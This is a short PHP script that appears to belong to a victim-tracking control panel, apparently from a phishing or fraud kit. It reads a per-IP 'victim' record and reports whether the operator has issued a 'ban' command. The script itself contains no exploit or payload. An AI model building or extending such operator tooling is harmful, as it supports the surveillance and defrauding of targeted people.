<?php
require_once 'functions.php';

$ip = isset($_GET['ip']) ? $_GET['ip'] : get_client_ip();

if (empty($ip)) {
    echo 'not_banned';
    exit;
}

// Sanitize IP to prevent directory traversal
$ip = preg_replace('/[^a-zA-Z0-9.:\-_]/', '', $ip);
if (empty($ip)) {
    $ip = get_client_ip();
}

$file = get_victim_file_path($ip);

if (!file_exists($file)) {
    echo 'not_banned';
    exit;
}

$data = @json_decode(@file_get_contents($file), true);

if (!is_array($data)) {
    echo 'not_banned';
    exit;
}

// Check if victim is banned
if (isset($data['command']) && $data['command'] === 'ban') {
    echo 'banned';
} else {
    echo 'not_banned';
}
?>

